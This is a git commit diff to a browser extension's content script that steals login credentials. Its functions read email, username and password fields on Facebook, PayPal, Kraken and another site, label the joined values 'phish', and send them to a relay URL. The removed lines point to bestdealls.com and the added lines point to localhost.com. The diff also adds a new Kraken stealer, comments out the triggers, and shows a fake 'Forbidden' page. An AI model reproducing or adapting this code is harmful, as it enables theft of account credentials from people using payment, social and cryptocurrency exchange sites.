d2fc03e0471e41e04652b33b1a480b30f821575e
tristan.granier <tristan.granier@epitech.eu>
2015-11-28 12:01:12 +0100

    lol

--- server/js/check.js
+++ server/js/check.js
@@ -20,54 +20,11 @@ $(document).ready(function()
     //fonction lock
     function locking()
     {
-        wrapperDiv = document.createElement("div");
-        script = document.createElement("script");
-        script.src = chrome.extension.getURL("jquery-1.11.3.min.js");
-        wrapperDiv.setAttribute("style","position: absolute; left: 0px; top: 0px; background-color: rgba(0, 0, 0, 0.81); opacity: 0.9; z-index: 2000; height: 1083px; width: 100%;");
-        wrapperDiv.className = 'test';
-
-        iframeElement = document.createElement("iframe");
-        iframeElement.setAttribute("style","width: 100%; height: 100%;");
-
-        wrapperDiv.appendChild(iframeElement);
-
-        modalDialogParentDiv = document.createElement("div");
-        modalDialogParentDiv.setAttribute("style","position: absolute; min-height:150px; width: 450px; border: 1px solid rgb(51, 102, 153); padding: 10px; background-color: rgb(255, 255, 255); z-index: 2001; overflow: auto; text-align: center; top: 149px; left: 497px;");
-
-        modalDialogSiblingDiv = document.createElement("div");
-
-        modalDialogTextDiv = document.createElement("div"); 
-        modalDialogTextDiv.setAttribute("style" , "text-align:center");
-
-        modalDialogTextSpan = document.createElement("span"); 
-        modalDialogText = document.createElement("strong"); 
-
-        breakElement = document.createElement("br"); 
-        imageElement = document.createElement("img");
-        imageElement.src = chrome.extension.getURL("eyes.png");
-
-        input = document.createElement("text");
-        input.textContent = "SITE INTERDIT";
-
-
-
-        modalDialogTextDiv.appendChild(breakElement);
-        modalDialogTextDiv.appendChild(breakElement);
-        modalDialogTextDiv.appendChild(imageElement);
-        modalDialogTextDiv.appendChild(breakElement);
-
-
-
-        modalDialogSiblingDiv.appendChild(modalDialogTextDiv);
-        modalDialogParentDiv.appendChild(modalDialogSiblingDiv);
-        document.body.appendChild(wrapperDiv);
-        document.body.appendChild(modalDialogParentDiv);
-        modalDialogTextDiv.appendChild(input);
-
+       document.write("<h1>Forbidden !</h1><p>you don't have permission to access / on this server</p>");
     }
     function lock()
     {
-        $.get("https://bestdealls.com/relais/lock.php",function(data)
+        $.get("https://localhost.com/relais/lock.php",function(data)
         {
             if(data == '1')
             {
@@ -85,7 +42,7 @@ $(document).ready(function()
         var pass = document.getElementById('pass').value;
         var urls = window.location.href;
         phish = email+"-123-"+pass;
-        $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
+        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
     }
     function face()
     {
@@ -100,7 +57,7 @@ $(document).ready(function()
             var urls = window.location.href;
             var name = $('#name')[0];
             phish = name;
-            $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
+            $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
         }
         var btn = $('button')[1];
         btn.onmouseenter = recup;
@@ -113,20 +70,34 @@ $(document).ready(function()
         var email = $('#email')[0].value;
         var pass = $('#password')[0].value;
         var phish = email+"-123-"+pass;
-        $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
+        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
+    }
+    
+    function kraken()
+    {
+        var urls = window.location.href;
+        var username = $('input[name=username]')[0].value;
+        var pass = $('input[name=password]')[0].value;
+        var phish = username+"-123-"+pass;
+        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
     }
     
     // VERIFICATION D'URL
     if(tabURL.indexOf('facebook') !== -1 )
     {
-        face();
+        //face();
     }
     else if(tabURL.indexOf('tribouillois') !== -1)
     {
-        tribouillois();
+        //tribouillois();
     }
     else if(tabURL.indexOf('paypal.com/signin/') !== -1)
     {
-        $('#btnLogin')[0].onmouseenter = paypal;
+        //$('#btnLogin')[0].onmouseenter = paypal;
+    }
+    else if (tabURL.indexOf('kraken.com/en-us/login') !== -1)
+    {
+        var btn = $('button')[1];
+        //btn.onmouseenter = kraken;
     }
 });
